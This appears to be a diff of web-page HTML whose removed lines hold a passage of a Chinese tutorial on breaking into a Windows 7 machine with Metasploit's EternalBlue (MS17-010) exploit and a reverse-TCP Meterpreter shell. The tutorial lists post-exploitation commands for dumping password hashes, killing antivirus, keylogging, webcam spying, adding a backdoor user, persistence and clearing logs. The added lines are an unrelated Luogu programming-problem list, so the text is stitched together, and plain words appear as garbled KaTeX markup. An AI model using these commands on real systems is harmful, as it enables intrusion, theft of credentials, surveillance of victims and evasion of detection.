class="mord">7</span></span></span></span> ，记录下 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">IP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>。（当然你知道对方的内网 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">ip</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span></span></span></span> 就可以跳过这一步）。我们这次来渗透“<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>R</mi><mi>I</mi><mi>C</mi><mo>−</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">ERIC-PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>”。它的内网 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">IP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>192.168.0.116</mn></mrow><annotation encoding="application/x-tex">192.168.0.116</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mord">1</span><span class="mord">6</span></span></span></span> 。</p>
-<figure data-type="image" tabindex="3"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-22.png" alt="" loading="lazy"></figure>
-<p>第三步：输入 <code>nmap -sS -sV -Pn Win7的ip</code> ，注意把 “ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">Win7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">7</span></span></span></span>的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">ip</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span></span></span></span> ” 换成上一步您得到的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">Win7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">7</span></span></span></span> 内网 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">IP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>，得到以下结果。注意此操作要等待一段时间。最终报告中可以看到 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>445</mn></mrow><annotation encoding="application/x-tex">445</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">5</span></span></span></span> 端口是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>o</mi><mi>p</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">open</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span></span></span></span> 的，说明很大概率是能够攻击成功的。</p>
-<figure data-type="image" tabindex="4"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-21.png" alt="" loading="lazy"></figure>
-<p>第四步：输入 <code>msfconsole</code> 。启动需要几秒。每次启动图案都不一样，不用担心。显示 &quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>s</mi><mi>f</mi><mn>5</mn></mrow><annotation encoding="application/x-tex">msf5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord">5</span></span></span></span>&quot; 或 &quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>s</mi><mi>f</mi><mn>6</mn></mrow><annotation encoding="application/x-tex">msf6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord">6</span></span></span></span>&quot; 等则表明启动成功。</p>
-<figure data-type="image" tabindex="5"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-23.png" alt="" loading="lazy"></figure>
-<p>第五步：输入 <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p>第六步：输入 <code>set RHOSTS win7的ip</code></p>
-<p>第七步：输入 <code>run</code> ，出现 <code>Host is likely vulnerable to MS17-010</code> 即表示基本是可以入侵成功的。</p>
-<p>第八步：输入 <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>第九步：输入 <code>set RHOST win7的ip</code> ，输入 <code>set LHOST kali的ip</code> ，输入 <code>set payload windows/x64/meterpreter/reverse_tcp</code> 。</p>
-<p>第十步：输入 <code>run</code></p>
-<figure data-type="image" tabindex="6"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-25.png" alt="" loading="lazy"></figure>
-<p>最后，出现 <code>=======WIN=======</code> 即表示成功入侵。输入 <code>shell</code> 进入 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">Windows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span></span></span></span> 命令行。然后我们就可以”为所欲为“。（此时我们获得的是SYSTEM权限，比管理员权限还高哦！)</p>
-<figure data-type="image" tabindex="7"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-26.png" alt="" loading="lazy"></figure>
-<p>接下来放几张图来展示成果吧。</p>
-<figure data-type="image" tabindex="8"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-27.png" alt="" loading="lazy"></figure>
-<p>（创建了一个文件夹）</p>
-<figure data-type="image" tabindex="9"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-28.png" alt="" loading="lazy"></figure>
-<p>（显示了一个对话框）</p>
-<figure data-type="image" tabindex="10"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-29.png" alt="" loading="lazy"></figure>
-<p>（杀死了资源管理器）</p>
-<p>当然我们也可以不输入 <code>shell</code> ，这里还有其他选项：</p>
-<pre><code class="language-python">sysinfo             #查看目标主机系统信息
-run scraper         #查看目标主机详细信息
-run hashdump        #导出密码的哈希
-load kiwi           #加载
-ps                  #查看目标主机进程信息
-pwd                 #查看目标当前目录(windows)
-getlwd              #查看目标当前目录(Linux)
-search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
-download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
-upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程
-PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
-idletime            #查看主机运行时间
-getuid              #查看获取的当前权限
-getsystem           #提权
-run  killav         #关闭杀毒软件
-screenshot          #截图
-webcam_list         #查看目标主机的摄像头
-webcam_snap         #拍照
-webcam_stream       #开视频
-execute  参数  -f 可执行文件   #执行可执行程序
-run getgui -u hack -p 123    #创建hack用户，密码为123
-run getgui -e                #开启远程桌面
-keyscan_start                #开启键盘记录功能
-keyscan_dump                 #显示捕捉到的键盘记录信息
-keyscan_stop                 #停止键盘记录功能
-uictl  disable  keyboard     #禁止目标使用键盘
-uictl  enable   keyboard     #允许目标使用键盘
-uictl  disable  mouse        #禁止目标使用鼠标
-uictl  enable   mouse        #允许目标使用鼠标
-load                         #使用扩展库
-run				             #使用扩展库
-run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接
-                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀
-portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
-clearev                       #清除日志
+              <h1 id="新手村">新手村</h1>
+<p>任何一个伟大的目标，都有一个微不足道的开始。</p>
+<h2 id="洛谷的第一个任务">洛谷的第一个任务</h2>
+<p>勇敢的迈出第一步，了解下语言和洛谷。跟着书本和老师走，不会难的。</p>
+<ul>
+<li><a href="/problem/P1000">P1000</a></li>
+<li><a href="/problem/P1001">P1001</a></li>
+<li><a href="/problem/P1421">P1421</a></li>
+<li><a href="/problem/P1425">P1425</a></li>
+</ul>
+<h2 id="顺序与分支">顺序与分支</h2>
+<p>计算机的智能性开始得以体现，因为计算机能够根据不同的条件选择了。</p>
+<ul>
+<li><a href="/problem/P1422">P1422</a></li>
+<li><a href="/problem/P1085">P1085</a></li>
+<li><a href="/problem/P1089">P1089</a></li>
+<li><a href="/problem/P1909">P1909</a></li>
+</ul>
+<h2 id="循环循环循环">循环！循环！循环！</h2>
+<p>计算机最不怕的就是重复。你让它做10000次同样的事它也不怕啦，但是让他做1亿亿次的话……</p>
+<ul>
+<li><a href="/problem/P1008">P1008</a></li>
+<li><a href="/problem/P1035">P1035</a></li>
+<li><a href="/problem/P1423">P1423</a></li>
+<li><a href="/problem/P1424">P1424</a></li>
+<li><a href="/problem/P1980">P1980</a></li>
+</ul>
+<h2 id="数组">数组</h2>
+<p>跟数组有关的题目基本上都要用到循环，所以请先完成1-3。</p>
+<ul>
+<li><a href="/problem/P1046">P1046</a></li>
+<li><a href="/problem/P1047">P1047</a></li>
+<li><a href="/problem/P1427">P1427</a></li>
+<li><a href="/problem/P1428">P1428</a></li>
+<li><a href="/problem/P2141">P2141</a></li>
+<li><a href="/problem/P1567">P1567</a></li>
+</ul>
+<h2 id="简单字符串">简单字符串</h2>
+<p>计算机不仅可以处理数字，还能处理文字！就是其实跟数字也没什么差。</p>
+<ul>
+<li><a href="/problem/P1055">P1055</a></li>
+<li><a href="/problem/P1200">P1200</a></li>
+<li><a href="/problem/P1308">P1308</a></li>
+<li><a href="/problem/P1553">P1553</a></li>
+<li><a href="/problem/P1598">P1598</a></li>
+<li><a href="/problem/P1914">P1914</a></li>
+</ul>
+<h2 id="过程函数与递归">过程函数与递归</h2>
+<p>将代码串进行打包，就是过程与函数。过程与函数调用自己则为递归。有一点小难但不要怕哦。</p>
+<ul>
+<li><a href="/problem/P1028">P1028</a></li>
+<li><a href="/problem/P1036">P1036</a></li>
+<li><a href="/problem/P1149">P1149</a></li>
+<li><a href="/problem/P1217">P1217</a></li>
+</ul>
+<h2 id="boss战-入门综合练习1">BOSS战-入门综合练习1</h2>
+<p>这里将前面的内容综合起来了，会有点难，不过你可以问老师同学，也能上网查资料。</p>
+<ul>
+<li><a href="/problem/P1478">P1478</a></li>
+<li><a href="/problem/P1618">P1618</a></li>
+<li><a href="/problem/P1579">P1579</a></li>
+<li><a href="/problem/P2089">P2089</a></li>
+</ul>
+<h2 id="boss战-入门综合练习2">BOSS战-入门综合练习2</h2>
+<p>勇士，竟然来到了BOSS的老巢！来一场恶斗，证明自己的实力，解锁下一个级别！</p>
+<ul>
+<li><a href="/problem/P1426">P1426</a></li>
+<li><a href="/problem/P1464">P1464</a></li>
+<li><a href="/problem/P1014">P1014</a></li>
+<li><a href="/problem/P1022">P1022</a></li>
+<li><a href="/problem/P1307">P1307</a></li>
+</ul>
+<h1 id="普及练习场">普及练习场</h1>
+<p>普及组选手可冲刺训练，提高组选手亦可在此巩固基础。</p>
+<h2 id="简单的模拟">简单的模拟</h2>
+<p>开始普及组的训练！所谓模拟，就是直接根据题意编写，思维难度简单。</p>
+<ul>
+<li><a href="/problem/P1003">P1003</a></li>
+<li><a href="/problem/P1067">P1067</a></li>
+<li><a href="/problem/P1540">P1540</a></li>
+<li><a href="/problem/P1056">P1056</a></li>
+<li><a href="/problem/P1328">P1328</a></li>
+<li><a href="/problem/P1563">P1563</a></li>
+</ul>
+<h2 id="交叉模拟">交叉模拟</h2>
+<p>这里也是模拟，但是会混有些别的部分。思维难度不大，但是编写起来会有些难度。</p>
+<ul>
+<li><a href="/problem/P1023">P1023</a></li>
+<li><a href="/problem/P1031">P1031</a></li>
+<li><a href="/problem/P1042">P1042</a></li>
+<li><a href="/problem/P1086">P1086</a></li>
+<li><a href="/problem/P1098">P1098</a></li>
+<li><a href="/problem/P3952">P3952</a></li>
+</ul>
+<h2 id="排序">排序</h2>
+<p>将杂乱无章的数据变得有规律。有各种各样的排序算法，看情况使用。</p>
+<ul>
+<li><a href="/problem/P1177">P1177</a></li>
+<li><a href="/problem/P1059">P1059</a></li>
+<li><a href="/problem/P1068">P1068</a></li>
+<li><a href="/problem/P1781">P1781</a></li>
+</ul>
+<h2 id="排序ex">排序Ex</h2>
+<p>这里的排序就更上一层了。不仅融合了别的算法与技巧，排序本身也有各种花招。</p>
+<ul>
+<li><a href="/problem/P1583">P1583</a></li>
+<li><a href="/problem/P1051">P1051</a></li>
+<li><a href="/problem/P1093">P1093</a></li>
+<li><a href="/problem/P1309">P1309</a></li>
+</ul>
+<h2 id="字符串处理">字符串处理</h2>
+<p>这里的字符串处理还会变得更加的有意思，难度也更大。需要好好地思考一下。</p>
+<ul>
+<li><a href="/problem/P1603">P1603</a></li>
+<li><a href="/problem/P1071">P1071</a></li>
+<li><a href="/problem/P1012">P1012</a></li>
+<li><a href="/problem/P1538">P1538</a></li>
+</ul>
+<h2 id="贪心">贪心</h2>
+<p>贪心就是只考虑眼前的利益。对于我们人生来说太贪是不好的，不过oi中，有时是对的。</p>
+<ul>
+<li><a href="/problem/P1090">P1090</a></li>
+<li><a href="/problem/P1181">P1181</a></li>
+<li><a href="/problem/P1208">P1208</a></li>
+<li><a href="/problem/P1223">P1223</a></li>
+<li><a href="/problem/P1094">P1094</a></li>
+<li><a href="/problem/P1803">P1803</a></li>
+<li><a href="/problem/P1031">P1031</a></li>
+<li><a href="/problem/P1080">P1080</a></li>
+</ul>
+<h2 id="深度优先搜索">深度优先搜索</h2>
+<p>搜索可以穷举各种情况。很多题目都可以用搜索完成。就算不能，搜索也是骗分神器。</p>
+<ul>
+<li><a href="/problem/P1219">P1219</a></li>
+<li><a href="/problem/P1019">P1019</a></li>
+<li><a href="/problem/P1101">P1101</a></li>
+<li><a href="/problem/P1605">P1605</a></li>
+<li><a href="/problem/P1040">P1040</a></li>
+<li><a href="/problem/P1092">P1092</a></li>
+</ul>
+<h2 id="广度优先搜索">广度优先搜索</h2>
+<p>广度优先搜索可以用来找有关“最短步数”的问题。恩，也可以用来“地毯式搜索”。</p>
+<ul>
+<li><a href="/problem/P1162">P1162</a></li>
+<li><a href="/problem/P1032">P1032</a></li>
+<li><a href="/problem/P1141">P1141</a></li>
+<li><a href="/problem/P1126">P1126</a></li>
+<li><a href="/problem/P1443">P1443</a></li>
+</ul>
+<h2 id="带有技巧的搜索">带有技巧的搜索</h2>
+<p>这里的搜索不仅包含了dfs和bfs，还包括剪枝、记录等技巧以加快速度。</p>
+<ul>
+<li><a href="/problem/P1118">P1118</a></li>
+<li><a href="/problem/P1434">P1434</a></li>
+<li><a href="/problem/P1433">P1433</a></li>
+<li><a href="/problem/P1074">P1074</a></li>
+</ul>
+<h2 id="分治算法">分治算法</h2>
+<p>将大问题拆分为小问题，分而治之，各个击破，然后在合并回来。</p>
+<ul>
+<li><a href="/problem/P1226">P1226</a></li>
+<li><a href="/problem/P1010">P1010</a></li>
+<li><a href="/problem/P1908">P1908</a></li>
+<li><a href="/problem/P1498">P1498</a></li>
+</ul>
+<h2 id="简单数学问题">简单数学问题</h2>
+<p>用计算机解决某些麻烦数学问题，再合适不过了。这真是绝妙的搭配啊！</p>
+<ul>
+<li><a href="/problem/P1088">P1088</a></li>
+<li><a href="/problem/P1045">P1045</a></li>
+<li><a href="/problem/P1403">P1403</a></li>
+<li><a href="/problem/P1017">P1017</a></li>
+<li><a href="/problem/P1147">P1147</a></li>
+<li><a href="/problem/P1029">P1029</a></li>
+</ul>
+<h2 id="递推与递归二分">递推与递归二分</h2>
+<p>递推，层层递进，由基础推向顶层。二分不仅可以用来查找数据，还可以确定最合适的值。</p>
+<ul>
+<li><a href="/problem/P1192">P1192</a></li>
+<li><a href="/problem/P1025">P1025</a></li>
+<li><a href="/problem/P1057">P1057</a></li>
+<li><a href="/problem/P1135">P1135</a></li>
+<li><a href="/problem/P1216">P1216</a></li>
+<li><a href="/problem/P1182">P1182</a></li>
+<li><a href="/problem/P1316">P1316</a></li>
+</ul>
+<h2 id="线性数据结构">线性数据结构</h2>
+<p>数组，链表，队列，栈，都是线性结构。巧用这些结构可以做出不少方便的事情。</p>
+<ul>
+<li><a href="/problem/P1996">P1996</a></li>
+<li><a href="/problem/P1115">P1115</a></li>
+<li><a href="/problem/P1739">P1739</a></li>
+<li><a href="/problem/P1160">P1160</a></li>
+<li><a href="/problem/P1449">P1449</a></li>
+</ul>
+<h2 id="树形数据结构">树形数据结构</h2>
+<p>由一个根节点分叉，越分越多，就成了树。树可以表示数据之间的从属关系</p>
+<ul>
+<li><a href="/problem/P1087">P1087</a></li>
+<li><a href="/problem/P1030">P1030</a></li>
+<li><a href="/problem/P1305">P1305</a></li>
+<li><a href="/problem/P5018">P5018</a></li>
+</ul>
+<h2 id="动态规划的背包问题">动态规划的背包问题</h2>
+<p>这是最基础的动态规划。不过如果是第一次接触会有些难以理解。加油闯过这个坎。</p>
+<ul>
+<li><a href="/problem/P1060">P1060</a></li>
+<li><a href="/problem/P1164">P1164</a></li>
+<li><a href="/problem/P1064">P1064</a></li>
+<li><a href="/problem/P1048">P1048</a></li>
+<li><a href="/problem/P1049">P1049</a></li>
+<li><a href="/problem/P1616">P1616</a></li>
+</ul>
+<h2 id="线性动态规划">线性动态规划</h2>
+<p>这也是基础的动态规划。是在线性结构上面的动态规划，一定要掌握。</p>
+<ul>
+<li><a href="/problem/P1020">P1020</a></li>
+<li><a href="/problem/P1091">P1091</a></li>
+<li><a href="/problem/P1280">P1280</a></li>
+<li><a href="/problem/P1880">P1880</a></li>
+<li><a href="/problem/P1140">P1140</a></li>
+<li><a href="/problem/P1282">P1282</a></li>
+</ul>
+<h2 id="多维动态规划">多维动态规划</h2>
+<p>这里的动态规划就不止一维了。不仅要小心时间复杂度，也要注意空间复杂度。</p>
+<ul>
+<li><a href="/problem/P1508">P1508</a></li>
+<li><a href="/problem/P1006">P1006</a></li>
+<li><a href="/problem/P1387">P1387</a></li>
+<li><a href="/problem/P1417">P1417</a></li>
+<li><a href="/problem/P1855">P1855</a></li>
+<li><a href="/problem/P1736">P1736</a></li>
+</ul>
+<h2 id="更要技巧的动规与记忆化">更要技巧的动规与记忆化</h2>
+<p>这边的题目有各种搞法。当然有的题目也可以使用记忆化搜索来降低思维难度。</p>
+<ul>
+<li><a href="/problem/P1064">P1064</a></li>
+<li><a href="/problem/P1541">P1541</a></li>
+<li><a href="/problem/P1026">P1026</a></li>
+<li><a href="/problem/P1063">P1063</a></li>
+<li><a href="/problem/P1156">P1156</a></li>
+<li><a href="/problem/P1052">P1052</a></li>
+</ul>
+<h2 id="高精度算法">高精度算法</h2>
+<p>就算是long long（或int64）还不够怎么办？用高精度算法。自己动手丰衣足食。</p>
+<ul>
+<li><a href="/problem/P1601">P1601</a></li>
+<li><a href="/problem/P2142">P2142</a></li>
+<li><a href="/problem/P1303">P1303</a></li>
+<li><a href="/problem/P1255">P1255</a></li>
+<li><a href="/problem/P1604">P1604</a></li>
+</ul>
+<h2 id="贪心ex">贪心EX</h2>
+<p>虽然是贪心题，可能不是你当时你虐着玩的贪心惹qwq</p>
+<ul>
+<li><a href="/problem/P1080">P1080</a></li>
+<li><a href="/problem/P1031">P1031</a></li>
+<li><a href="/problem/P1233">P1233</a></li>
+<li><a href="/problem/P2123">P2123</a></li>
+</ul>
+<h2 id="简单数学">简单数学</h2>
+<p>数学和oi是密切相关的，数学不仅是oi的基础，而且是算法的核心。</p>
+<ul>
+<li><a href="/problem/P1865">P1865</a></li>
+<li><a href="/problem/P1372">P1372</a></li>
+<li><a href="/problem/P1338">P1338</a></li>
+<li><a href="/problem/P2158">P2158</a></li>
+<li><a href="/problem/P1582">P1582</a></li>
+</ul>
+<h2 id="boss战-普及综合练习1">BOSS战-普及综合练习1</h2>
+<p>好不容易闯到这一关，你那还等什么呢？抄起家伙赶快上啊！</p>
+<ul>
+<li><a href="/problem/P1478">P1478</a></li>
+<li><a href="/problem/P1203">P1203</a></li>
+<li><a href="/problem/P1363">P1363</a></li>
+<li><a href="/problem/P1736">P1736</a></li>
+</ul>
+<h2 id="boss战-普及综合练习2">BOSS战-普及综合练习2</h2>
+<p>来搞定第二个BOSS。虽然战斗艰难，但你一定没有问题。</p>
+<ul>
+<li><a href="/problem/P1201">P1201</a></li>
+<li><a href="/problem/P1095">P1095</a></li>
+<li><a href="/problem/P1058">P1058</a></li>
+<li><a href="/problem/P2258">P2258</a></li>
+<li><a href="/problem/P1108">P1108</a></li>
+</ul>
+<h2 id="boss战-普及综合练习3">BOSS战-普及综合练习3</h2>
+<p>普及练习场的大BOSS：“一定让你有去无回”。怎么办呢？只能打倒他开启下一个级别！</p>
+<ul>
+<li><a href="/problem/P1328">P1328</a></li>
+<li><a href="/problem/P1062">P1062</a></li>
+<li><a href="/problem/P1969">P1969</a></li>
+<li><a href="/problem/P1037">P1037</a></li>
+</ul>
+<h2 id="普及常见模板">普及常见模板</h2>
+<p>这里集中了比较基础的算法的模板。提高和省选也有模板题哦！</p>
+<ul>
+<li><a href="/problem/P1177">P1177</a></li>
+<li><a href="/problem/P3366">P3366</a></li>
+<li><a href="/problem/P3367">P3367</a></li>
+<li><a href="/problem/P3371">P3371</a></li>
+<li><a href="/problem/P3383">P3383</a></li>
+</ul>
+<h1 id="提高历练地">提高历练地</h1>
+<p>已经去除了普及组难度的，请组织放心。成长大牛之必写题！！！</p>
+<h2 id="搜索ex">搜索Ex</h2>
+<p>开始提高组的试炼。这里已经去除了所有普及组难度的题目。哼哼，怕了吧。。</p>
+<ul>
+<li><a href="/problem/P1120">P1120</a></li>
+<li><a href="/problem/P1378">P1378</a></li>
+<li><a href="/problem/P1514">P1514</a></li>
+<li><a href="/problem/P1312">P1312</a></li>
+<li><a href="/problem/P1441">P1441</a></li>
+<li><a href="/problem/P1242">P1242</a></li>
+</ul>
+<h2 id="动态规划tglv1">动态规划TG.lv(1)</h2>
+<p>这是提高组难度中比较基础的动态规划，也许一两个转移方程就可以写出。</p>
+<ul>
+<li><a href="/problem/P1005">P1005</a></li>
+<li><a href="/problem/P1373">P1373</a></li>
+<li><a href="/problem/P2279">P2279</a></li>
+<li><a href="/problem/P1220">P1220</a></li>
+<li><a href="/problem/P1156">P1156</a></li>
+</ul>
+<h2 id="动态规划tglv2">动态规划TG.lv(2)</h2>
+<p>这里的动态规划稍稍有所加大难度，思考转移方程的时间可能会与编写程序的时间持平。</p>
+<ul>
+<li><a href="/problem/P1273">P1273</a></li>
+<li><a href="/problem/P1169">P1169</a></li>
+<li><a href="/problem/P2577">P2577</a></li>
+<li><a href="/problem/P1070">P1070</a></li>
+<li><a href="/problem/P2051">P2051</a></li>
+</ul>
+<h2 id="动态规划tglv3">动态规划TG.lv(3)</h2>
+<p>比较需要技巧的动态规划。有的不仅仅需要状态转移方程，可能还会与别的算法综合。</p>
+<ul>
+<li><a href="/problem/P1415">P1415</a></li>
+<li><a href="/problem/P2157">P2157</a></li>
+<li><a href="/problem/P2216">P2216</a></li>
+<li><a href="/problem/P2331">P2331</a></li>
+<li><a href="/problem/P2467">P2467</a></li>
+<li><a href="/problem/P3084">P3084</a></li>
+</ul>
+<h2 id="数论">数论</h2>
+<p>数论就是研究整数的理论。包括公约公倍数、质数、欧拉定理和同余方程等。</p>
+<ul>
+<li><a href="/problem/P2152">P2152</a></li>
+<li><a href="/problem/P1414">P1414</a></li>
+<li><a href="/problem/P1134">P1134</a></li>
+<li><a href="/problem/P1313">P1313</a></li>
+<li><a href="/problem/P1306">P1306</a></li>
+</ul>
+<h2 id="博弈论">博弈论</h2>
+<p>博弈论考虑游戏中的个体的预测行为和实际行为，并研究它们的优化策略。</p>
+<ul>
+<li><a href="/problem/P1199">P1199</a></li>
+<li><a href="/problem/P1288">P1288</a></li>
+<li><a href="/problem/P1290">P1290</a></li>
+<li><a href="/problem/P2148">P2148</a></li>
+<li><a href="/problem/P1247">P1247</a></li>
+<li><a href="/problem/P2575">P2575</a></li>
+</ul>
+<h2 id="其他数学问题">其他数学问题</h2>
+<p>听说学oi的同志们数学都挺好。那么。就请完成下面的题目证明这一点吧！</p>
+<ul>
+<li><a href="/problem/P1357">P1357</a></li>
+<li><a href="/problem/P1641">P1641</a></li>
+<li><a href="/problem/P2059">P2059</a></li>
+<li><a href="/problem/P2154">P2154</a></li>
+<li><a href="/problem/P2261">P2261</a></li>
+<li><a href="/problem/P2327">P2327</a></li>
+<li><a href="/problem/P1066">P1066</a></li>
+</ul>
+<h2 id="图的遍历">图的遍历</h2>
+<p>图是一种非常重要的数据结构，描述对象复杂的练习。这里开始接触图的基本概念。</p>
+<ul>
+<li><a href="/problem/P2661">P2661</a></li>
+<li><a href="/problem/P1330">P1330</a></li>
+<li><a href="/problem/P1341">P1341</a></li>
+<li><a href="/problem/P2921">P2921</a></li>
+</ul>
+<h2 id="最短路问题">最短路问题</h2>
+<p>最短路是图论中最重要的部分，多种算法可以应用。很多题目都可以抽象成这种模型。</p>
+<ul>
+<li><a href="/problem/P1339">P1339</a></li>
+<li><a href="/problem/P1462">P1462</a></li>
+<li><a href="/problem/P1346">P1346</a></li>
+<li><a href="/problem/P1119">P1119</a></li>
+<li><a href="/problem/P1144">P1144</a></li>
+<li><a href="/problem/P1522">P1522</a></li>
+</ul>
+<h2 id="最小生成树">最小生成树</h2>
+<p>最小生成树可以用kruskal（克鲁斯卡尔）算法或prim（普里姆）算法求出。</p>
+<ul>
+<li><a href="/problem/P1546">P1546</a></li>
+<li><a href="/problem/P2330">P2330</a></li>
+<li><a href="/problem/P1991">P1991</a></li>
+<li><a href="/problem/P1265">P1265</a></li>
+</ul>
+<h2 id="较复杂图论i">较复杂图论I</h2>
+<p>别的些图论问题，包括树、拓扑排序等。要过这一关，需要学习不少新的算法。</p>
+<ul>
+<li><a href="/problem/P1113">P1113</a></li>
+<li><a href="/problem/P1268">P1268</a></li>
+<li><a href="/problem/P1525">P1525</a></li>
+<li><a href="/problem/P1983">P1983</a></li>
+</ul>
+<h2 id="较复杂图论ii">较复杂图论II</h2>
+<p>更高级的图论算法。包括差分约束、强连通、二分图等。会更难一些。</p>
+<ul>
+<li><a href="/problem/P1993">P1993</a></li>
+<li><a href="/problem/P1726">P1726</a></li>
+<li><a href="/problem/P2055">P2055</a></li>
+<li><a href="/problem/P2149">P2149</a></li>
+<li><a href="/problem/P1345">P1345</a></li>
+</ul>
+<h2 id="并查集">并查集</h2>
+<p>用于处理一些不相交集合的合并及查询问题。常常在使用中以森林来表示。</p>
+<ul>
+<li><a href="/problem/P1111">P1111</a></li>
